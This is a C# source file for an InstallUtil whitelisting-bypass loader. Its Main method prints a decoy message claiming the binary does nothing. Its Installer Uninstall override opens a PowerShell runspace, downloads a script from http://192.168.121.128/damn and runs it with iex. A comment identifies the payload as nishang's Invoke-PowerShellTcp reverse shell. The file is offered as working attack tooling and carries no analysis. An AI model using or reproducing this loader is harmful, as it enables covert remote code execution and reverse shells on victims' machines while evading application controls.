using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;
using System.Runtime.InteropServices;

namespace installdamn
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Nothing going on in this binary.");
        }
    }

    


    [System.ComponentModel.RunInstaller(true)]
    public class Sample : Installer
    {

        public override void Uninstall(System.Collections.IDictionary savedState)
        {

            /* Install Util Method ; Define what you would like to run
             powershell damn script used here is taken from l https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1 
            
            */


            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            String cmd = "iex((new-object system.net.webclient).downloadstring('http://192.168.121.128/damn'))";

            foreach (ErrorRecord err in ps.Streams.Error)
                Console.Write("Error: " + err.ToString());

            ps.AddScript(cmd);
            System.Threading.Thread.Sleep(3000);
            Console.WriteLine("Yes , this script ran");
            ps.Invoke();
            rs.Close();

        }
    }
}
